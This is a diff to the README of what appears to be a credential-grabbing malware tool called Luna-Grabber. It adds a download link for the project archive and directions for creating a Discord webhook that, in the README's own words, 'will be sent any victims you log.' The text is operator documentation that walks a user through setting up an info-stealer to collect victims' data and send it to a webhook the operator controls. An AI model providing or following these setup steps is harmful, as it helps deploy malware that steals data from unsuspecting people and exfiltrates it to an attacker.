@@ -69,12 +69,12 @@
   
 ## Installation
 
-### 1. Download Python:
+### 1. [Download](https://www.python.org/downloads/) Python:
 
 ```
-Make sure you have Python installed 3.11+ and it is added to your path
+Make sure you have Python 3.11+ installed and it is added to your path.
 ```
-### 2. Download The Files:
+### 2. [Download](https://github.com/Smug246/Luna-Grabber/archive/refs/heads/main.zip) The Files:
 
 ```
 Once you've downloaded the files extract the folder so it's no longer a .zip file.
@@ -88,6 +88,9 @@ open the gui.
 ### 4. Create A Webhook:
 
 ```
+If you don't know how to make a webhook you can follow this guide: https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks
+If that is to hard for you, you can also use this tool: https://github.com/Serpensin/DiscordBots-WebhookCreator
+
 This webhook will be sent any victims you log so don't delete it once it's made. Once you've created one paste it
 into the box which asks for your webhook.
 ```
